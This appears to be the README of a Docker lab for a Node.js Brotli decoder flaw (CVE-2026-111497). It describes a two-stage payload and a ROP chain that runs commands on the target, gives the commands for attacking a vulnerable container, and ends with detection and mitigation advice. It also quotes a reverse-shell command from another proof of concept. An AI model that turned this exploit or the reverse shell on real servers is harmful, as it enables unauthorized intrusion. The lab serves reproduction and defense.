<div align="center">

# node2shell-lab

**Reproducible lab and client for CVE-2026-111497 (Node2Shell) an out-of-bounds write in the Brotli decoder bundled with Node.js, reachable through `Content-Encoding: br` request bodies, ending in worker hijack and command execution.**

![CWE-252](https://img.shields.io/badge/CWE-252-red)
![CWE-787](https://img.shields.io/badge/CWE-787-red)
![Node.js](https://img.shields.io/badge/Node.js-24.22.0%20→%2024.22.1-339933?logo=node.js&logoColor=white)
![Python](https://img.shields.io/badge/PoC-Python%203%20(stdlib%20only)-3776AB?logo=python&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-blue)
![Scope](https://img.shields.io/badge/scope-lab%20only-orange)

</div>

> **Legal notice.** This project is for education, defensive research and
> demonstration in a controlled environment. Run it only against the
> containers built from this repository, or against systems you own or have
> prior written authorization to test. By default the client opens a prompt
> where **you type** which command (no arguments) to run on the target for
> each attempt; pass `--mode id` for the original one-shot `/usr/bin/id`
> baseline.

---

## Contents

- [Overview](#overview)
- [Affected versions](#affected-versions)
- [Attack surfaces](#attack-surfaces)
- [Root cause](#root-cause)
- [Lab architecture](#lab-architecture)
- [Requirements](#requirements)
- [Quick start](#quick-start)
- [Running the attack](#running-the-attack)
- [Expected output](#expected-output)
- [How the exploit works](#how-the-exploit-works)
- [Why it's probabilistic](#why-its-probabilistic)
- [About the EQSTLab reverse-shell PoC (full transparency)](#about-the-eqstlab-reverse-shell-poc-full-transparency)
- [Detection](#detection)
- [Mitigation](#mitigation)
- [Repository layout](#repository-layout)
- [References](#references)
- [License and credits](#license-and-credits)

---

## Overview

Google's Brotli decoder accepts an invalid *block switch* when a stream
declares only one block type. `DecodeBlockTypeAndLength()` returned
`BROTLI_FALSE` both for "need more input" and for "invalid format," and the
streaming path treated the permanent error as a temporary one, continuing
with corrupted internal state.

Between calls, the decoder keeps unconsumed bytes in an internal **8-byte**
buffer. The invalid-format error never drains that buffer; more bytes keep
arriving, and past the eighth byte the writes run off the end of it. The
result is an out-of-bounds write relative to the ring buffer, with an
attacker-controlled `int32` offset and a 16-byte attacker-controlled copy
memory corruption that can lead to a crash, a memory leak, or remote code
execution.

| | |
|---|---|
| **CVE** | CVE-2026-111497 |
| **Public names** | Node2Shell, HTTP2Shell, Broccoli2Shell |
| **Class** | CWE-252 (Unchecked Return Value), CWE-787 (Out-of-bounds Write) |
| **Vector** | Network, unauthenticated, any Brotli stream the app decompresses |
| **Component** | Google Brotli `c/dec/decode.c`, bundled inside Node.js |
| **Severity** | CVSS 4.0 base score 9.2 (Critical) |
| **Disclosed** | 2026-10-21 (Node.js) · 2026-10-22 (NVD) |
| **Exploited in the wild** | Yes — CISA KEV / observed activity in October 2026 |

The upstream fix is commit
[`0ed4268a`](https://github.com/google/brotli/commit/0ed4268a) ("Detect and
report invalid stream earlier"), which introduces
`BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH` (`-17`).

## Affected versions

| Runtime | Affected | Fixed |
|---|---|---|
| Node.js 22.x | `< 22.23.4` | `22.23.4+` |
| Node.js 24.x | `< 24.22.1` | `24.22.1+` |
| Node.js 26.x | `< 26.12.1` | `26.12.1+` |
| Node.js 20.x / 23.x / 25.x | all | no fix (EOL) |
| Google Brotli | `1.0.3 – 1.2.0` | `1.0.10`, `1.1.1`, `1.2.1` |
| Bun | `< 1.4.4` | `1.4.4+` |

Node.js cherry-picked the fix without bumping the `process.versions.brotli`
string, so the *runtime* version not the Brotli version string — is what
matters for Node.

## Attack surfaces

1. **Request body** with `Content-Encoding: br` — Express 5 / body-parser
   2.x inflate the body before the route handler runs.
2. **Response body** consumed with `fetch()` / undici / axios / got when the
   remote server returns Brotli-encoded data.
3. **Direct use** of `node:zlib` (`brotliDecompress`,
   `createBrotliDecompress`) on untrusted input.

This lab reproduces surface **1**: `POST /upload` with `Content-Encoding: br`
against an Express 5.3.0 + body-parser 2.4.0 application.

## Root cause

### 1. One error code, two meanings

`DecodeBlockTypeAndLength()` returns the same `BROTLI_FALSE` whether it ran
out of input bytes (recoverable ask for more) or the stream declared an
impossible block switch (unrecoverable the stream is malformed). The
streaming wrapper around the decoder can't tell the two apart, so it always
takes the recoverable path.

### 2. The 8-byte ring buffer never drains

```text
State machine (simplified):

  NEEDS_MORE_INPUT  <--- (bug) invalid block switch is misreported as this
         │
         ▼
  keep buffering into an internal 8-byte window
         │
         ▼ (9th, 10th, ... byte of attacker-controlled stream)
  write past the end of the 8-byte window  -->  OOB WRITE
```

Because the error is never surfaced as a hard failure, the client keeps
feeding bytes. Past the eighth one, writes land outside the small internal
buffer, with an attacker-controlled `int32` offset into the ring buffer and
a 16-byte attacker-controlled payload copied there.

### 3. From OOB write to control-flow hijack

The exploit client in this lab (`exploit/node2shell.py`) ships a
two-stage request:

- **Stage 1** places a 1031-byte attacker-controlled prefix into the Brotli
  metadata block, then the malformed block-switch stream. The vulnerable
  decoder parks in the broken `NEEDS_MORE_INPUT` state; a patched decoder
  returns `-17` immediately.
- **Stage 2** supplies a position/size pair that turns the parked state into
  the 16-byte OOB write. The write lands on the saved return address of the
  libuv worker's stack frame, overwriting it with the address of a `pivot`
  gadget that jumps execution back into the attacker-controlled prefix
  (the ring buffer) sitting in stage 1.
- From there, a short ROP chain runs `dup2(accepted_socket_fd, 1)` followed
  by `execvp(path, NULL)`: the hijacked HTTP connection's stdout becomes the
  exploited process's stdout, and whatever zero-argument binary `path`
  names gets to run and have its output read back on that same socket.

```text
 client (exploit/node2shell.py)        target (node v24.22.0)
   │ Brotli stream, stage 1 (prefix)      │
   ├─────────────────────────────────────>│  decoder "parks" (bug)
   │ Brotli stream, stage 2 (position)    │
   ├─────────────────────────────────────>│  OOB write hits saved RA
   │                                       │  ROP: pivot -> dup2 -> execvp(path)
   │ <── path's stdout, on the same socket│
```

## Lab architecture

```
┌────────────────────────── docker network labnet ─────────────────────────┐
│  ┌───────────────────┐    HTTP    ┌──────────────────────────────────┐   │
│  │ attacker           │───────────>│ target (vulnerable)             │   │
│  │ python:3.12-slim   │   :3000    │ node:24.22.0-bookworm-slim      │   │
│  │ /exploit/node2shell│            │ Express 5.3.0 + body-parser 2.4 │   │
│  │ network_mode: host │            │ UV_THREADPOOL_SIZE=1            │   │
│  └───────────────────┘            │ restart supervisor (shell loop) │   │
│                                    └──────────────────────────────────┘   │
│                                    ┌──────────────────────────────────┐   │
│                                    │ patched (control)                │   │
│                                    │ node:24.22.1-bookworm-slim :3000 │   │
│                                    └──────────────────────────────────┘   │
└────────────────────────────────────────────────────────────────────────┘
          ▲ 127.0.0.1:3000 (target)         ▲ 127.0.0.1:3001 (patched)
```

- **target** (`n2s-target`) official Node.js **v24.22.0**, Express 5.3.0,
  body-parser 2.4.0, `UV_THREADPOOL_SIZE=1`, and a shell supervisor that
  restarts the process after every crash. Published on `127.0.0.1:3000`.
- **patched** (`n2s-patched`) the same application on Node.js
  **v24.22.1**. Published on `127.0.0.1:3001`.
- **attacker** (`n2s-attacker`) Python 3.12, no third-party dependencies,
  `network_mode: host` so it can reach the targets published on loopback.

The pinned Node v24.22.0 binary has SHA-256
`67ca5783febb8bf85736c79fcdd92c8d6d465a0eb2a082672bcdfa76a506751c` the
exact build the exploit's offsets and gadget addresses were calibrated for.
v24.22.1 ships a different binary and rejects the stream with `-17`.

## Requirements

- Docker Engine with Compose v2
- Linux x86-64 host (the exploit's offsets target a non-PIE x86-64 build)
- ports 3000/3001 free on `127.0.0.1`

> The `attacker` container uses `network_mode: host` to reach
> `127.0.0.1:3000/3001`. On Docker Desktop (macOS/Windows) that mode doesn't
> share the host loopback run the Python client directly on the host, or
> adjust the compose network, in that case.

## Quick start

```bash
cd node2shell-lab

# build + start all three containers
./lab.sh up

# run the exploit (may take a few minutes; it's probabilistic)
# -> by default this opens a "command>" prompt: YOU type what to run
#    (absolute path, no arguments: /usr/bin/id, /usr/bin/whoami, ...)
./lab.sh attack

# one-shot mode, same as the original PoC (non-interactive, good for CI)
./lab.sh attack --mode id

# if the first round misses the ASLR layout, try again
./lab.sh attack-loop

# control: the patched target rejects the same trigger
./lab.sh patched

# control: the vulnerable target does not return the -17 error (worker dies)
./lab.sh check-vuln

# target logs (crashes, restarts)
./lab.sh logs

# tear everything down
./lab.sh down
```

You can also drop into the containers directly:

```bash
./lab.sh shell-attacker
./lab.sh shell-target
```

Inside the attacker container:

```bash
python3 /exploit/node2shell.py --host 127.0.0.1 --port 3000             # you type the command
python3 /exploit/node2shell.py --host 127.0.0.1 --port 3000 --mode id   # one shot, /usr/bin/id
python3 /exploit/patched_check.py --host 127.0.0.1 --port 3001
```

## Running the attack

| Mode | Flag | What it does |
|---|---|---|
| **pick** | `--mode pick` (default) | Interactive prompt: type an absolute, zero-argument command path; each line triggers its own exploit run (with its own ASLR retry loop) and prints that command's output. |
| **id** | `--mode id` | Non-interactive one-shot baseline: runs `/usr/bin/id` and exits. This is exactly what `evidence/*.log` captured. |
| **shell** | `--mode shell` | Experimental attempt at a full `/bin/sh` with stdin wired up too — **confirmed broken on this build**, see below. Kept for further research. |

## Expected output

### `--mode pick` (default)

```text
[*] target=127.0.0.1:3000 profile=node-v24.22.0-express-x86_64 mode=pick
[*] Type the absolute path of a command with NO arguments to run on the
    target (e.g. /usr/bin/id, /usr/bin/whoami, /usr/bin/uname,
    /usr/bin/hostname, /bin/pwd, /usr/bin/date). 'exit' to quit.

command> /usr/bin/id
[*] attempt 1/16 (/usr/bin/id)
[*] miss; forcing a fresh worker (network crash trigger)
[*] attempt 2/16 (/usr/bin/id)

[+] RCE CONFIRMED
[+] proof_command = /usr/bin/id
[+] proof_stdout  = uid=1000(node) gid=1000(node) groups=1000(node)

command> /usr/bin/whoami
[*] attempt 1/16 (/usr/bin/whoami)

[+] RCE CONFIRMED
[+] proof_command = /usr/bin/whoami
[+] proof_stdout  = node

command> exit
```

This is the exact ROP chain proven by the reference profile
(`dup2(accepted_socket_fd, 1)` + `execvp(path, NULL)`) only `path` is no
longer hardcoded to `/usr/bin/id`: every line you type at the prompt fires a
fresh exploit round (with its own ASLR retry) using the command you chose.
The real limitation of the primitive is that `execvp` is called with no
`argv`, so it only works with binaries that need no arguments (`id`,
`whoami`, `uname`, `hostname`, `pwd`, `date`, ...) something like
`cat /etc/passwd` is not reachable this way.

### `--mode id`

```text
[*] target=127.0.0.1:3000 profile=node-v24.22.0-express-x86_64 mode=id
[*] building two-stage Brotli payload (position=0x137ed748)...
[*] stage1=23069727 bytes stage2=256 bytes
[*] attempt 1/16
[*] miss; forcing a fresh worker (network crash trigger)
...
[+] RCE CONFIRMED
[+] proof_channel = HTTP request socket stdout
[+] proof_command = /usr/bin/id
[+] proof_stdout  = uid=1000(node) gid=1000(node) groups=1000(node)
[+] successful_attempt = 8
```

The `uid=`/`gid=` line is produced by `/usr/bin/id` **inside the target's
Node process** and returned on the same HTTP socket that carried the
exploit request. This is the proven baseline (what `evidence/*.log`
captured) and is easier to script/log than an interactive session.

### Patched control

```text
[*] sending malformed Brotli stream to 127.0.0.1:3001
[*] connected=True status=HTTP/1.1 400 Bad Request
[+] decoder rejected the stream with ERR__ERROR_FORMAT_BLOCK_SWITCH
[+] PASS: patched target rejected the invalid block switch
```

## How the exploit works

1. **Stream generation** (`exploit/trigger/brotli_stream.py`): builds a
   Brotli metadata block carrying a 1031-byte attacker-controlled prefix,
   followed by a meta-block that declares **one** literal block type and
   attempts an invalid block switch.
2. **Stage 1**: the vulnerable decoder treats the invalid switch as
   `NEEDS_MORE_INPUT`, parks, and keeps its 8-byte internal buffer around.
   The patched target returns `-17` immediately.
3. **Stage 2**: delivers the position/size pair that turns the parked state
   into the 16-byte OOB write. The destination is `ring_buffer + offset`
   (`int32`); the stage-1 prefix already placed a pair of gadgets where the
   copy reads from.
4. **Control-flow hijack**: the write overwrites the saved return address on
   the libuv worker's stack. The ROP chain pivots into the ring buffer and
   runs `dup2(accepted_socket_fd, 1)` + `execvp(path, NULL)`. Only stdout is
   wired to the socket — this is the exact chain published in the reference
   profile (see `exploit/ATTRIBUTION.md`), with zero spare bytes in the
   prefix. In `--mode id`, `path` is fixed to `/usr/bin/id`; in `--mode pick`
   (default) it's whatever you type at the prompt each round — same chain,
   same primitive, only the path string changes.
   - `--mode shell` (experimental, does not work on this build): an attempt
     to extend the chain with `dup2(accepted_socket_fd, 0)` and
     `dup2(accepted_socket_fd, 2)` as well, before `execvp("/bin/sh", NULL)`,
     to wire up stdin and get a real shell. That needs more gadgets and a
     larger prefix (`shell_prefix_size` in `node2shell.py`) than the proven
     1031-byte one — tested against the real target, the result is a
     segfault on 100% of attempts, not a normal probabilistic miss. Left in
     the code as a starting point for whoever wants to pursue it with
     gdb/objdump against the exact binary.
5. **Miss**: if the ASLR guess doesn't land, the worker dies with
   `SIGSEGV`. The supervisor restarts Node with a fresh layout; the client
   retries up to 16 times.

## Why it's probabilistic

The exploit depends on:

- the exact binary (Node v24.22.0 x86-64, non-PIE) and its fixed offsets;
- the process's heap/stack layout, which changes with ASLR on every
  restart;
- the connection's accepted socket being **fd 19** (an otherwise idle
  service, single worker);
- the supervisor actually restarting the process after the crash.

In our own runs, the hit landed on the 2nd, 3rd, 4th, 8th, 10th and 16th
attempt, depending on the sampled layout. If 16 attempts don't land, run
`./lab.sh attack-loop` again.

## About the EQSTLab reverse-shell PoC (full transparency)

The [EQSTLab/CVE-2026-111497](https://github.com/EQSTLab/CVE-2026-111497)
PoC gets a full interactive `bash` by making the target connect back
(`bash -i >& /dev/tcp/HOST/PORT 0>&1`) to a Python listener it opens itself,
then upgrading that connection to a pty with `pty.spawn`.

This lab's client tried to port that behavior directly by extending the
proven ROP chain to `dup2` the hijacked socket onto stdin, stdout **and**
stderr before `execvp("/bin/sh", NULL)` (the code is still there, behind
`--mode shell`). **It was tested against the real target in this repository
and confirmed broken**: the worker segfaults on every single attempt instead
of completing the pivot not a normal ASLR-dependent miss, but a structural
one, most likely because the longer chain needs more attacker-controlled
bytes than the proven 1031-byte prefix has room for, and simply growing that
buffer (`shell_prefix_size`) does not land cleanly without real
reverse-engineering of the exact binary (gdb/objdump), which this lab does
not attempt to fake.

`--mode pick` is the way this lab actually delivers "you type the command
yourself" today: same proven primitive, zero-argument commands, chosen
interactively instead of hardcoded.

## Detection

1. **Crash signature.** `SIGSEGV` on a Node worker shortly after it
   processes a request/response with `Content-Encoding: br`, especially
   followed by an immediate respawn.
2. **Request shape.** A Brotli stream whose metadata/block-type section
   declares a single literal block type and attempts a block switch — most
   legitimate encoders never emit this shape.
3. **Timing.** Repeated identical-looking requests against the same
   endpoint in a short window (ASLR-driven retries look like a burst of
   near-duplicate POSTs).
4. **Process behavior.** Unexpected child processes spawned by the Node
   process right after a crash/restart cycle, with the Node worker's socket
   fd visible as the child's stdout.

## Mitigation

1. **Upgrade Node.js** to `22.23.4`, `24.22.1`, `26.12.1`, or later. Node
   20.x/23.x/25.x are EOL and receive no fix.
2. If Node links the system's libbrotli, upgrade that distribution package
   too (`brotli 1.0.10`/`1.1.1`/`1.2.1`).
3. Until patched, **reject inbound `Content-Encoding: br`** at the
   proxy/WAF. This does not cover Brotli responses consumed by the app
   itself.
4. Monitor Node process crashes during decompression and unexpected
   restarts; an attack that misses the layout is still a DoS and can leave
   core dumps with sensitive memory.
5. Don't rely on `process.versions.brotli` to confirm the Node runtime is
   patched — Node cherry-picked the fix without bumping that string.

## Repository layout

```
node2shell-lab/
├── docker-compose.yml          # target, patched, attacker
├── lab.sh                      # operational shortcuts
├── README.md
├── LICENSE                     # MIT (lab code)
├── target/
│   ├── Dockerfile              # ARG NODE_IMAGE (24.22.0 or 24.22.1)
│   ├── package.json            # express 5.3.0 + body-parser 2.4.0
│   ├── package-lock.json
│   └── server.js                # /health and /upload (express.json)
├── exploit/
│   ├── node2shell.py            # exploit client (stdlib only, pick/id/shell)
│   ├── patched_check.py         # -17 differential check on the patched target
│   ├── ATTRIBUTION.md
│   └── trigger/
│       ├── __init__.py
│       ├── LICENSE              # MIT (Arkango)
│       └── brotli_stream.py     # stream generator (MIT, Arkango)
└── evidence/                    # run logs (optional)
```

## References

- [Node.js — October 2026 Security Releases](https://nodejs.org/en/blog/vulnerability/october-2026-security-releases)
- [NVD — CVE-2026-111497](https://nvd.nist.gov/vuln/detail/CVE-2026-111497)
- [Arkango/CVE-2026-111497](https://github.com/Arkango/CVE-2026-111497) — MIT
  stream generator vendored into `exploit/trigger/brotli_stream.py`.
- [dimasma0305/CVE-2026-111497-POC](https://github.com/dimasma0305/CVE-2026-111497-POC)
  public profile with the offsets/gadgets and calibrated position used as
  factual reference. This lab's client was reimplemented independently; no
  file from that repository is included.
- [EQSTLab/CVE-2026-111497](https://github.com/EQSTLab/CVE-2026-111497) —
  reverse-shell PoC referenced in
  [About the EQSTLab reverse-shell PoC](#about-the-eqstlab-reverse-shell-poc-full-transparency).
- [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- CWE-252 (Unchecked Return Value), CWE-787 (Out-of-bounds Write)

## License and credits

Lab code released under the [MIT License](LICENSE). The Brotli stream
generator in `exploit/trigger/brotli_stream.py` is vendored from
[Arkango/CVE-2026-111497](https://github.com/Arkango/CVE-2026-111497) (MIT,
Copyright (c) 2026 Arkango) with its original notice preserved; see
`exploit/ATTRIBUTION.md` for the full attribution of every external
reference used.
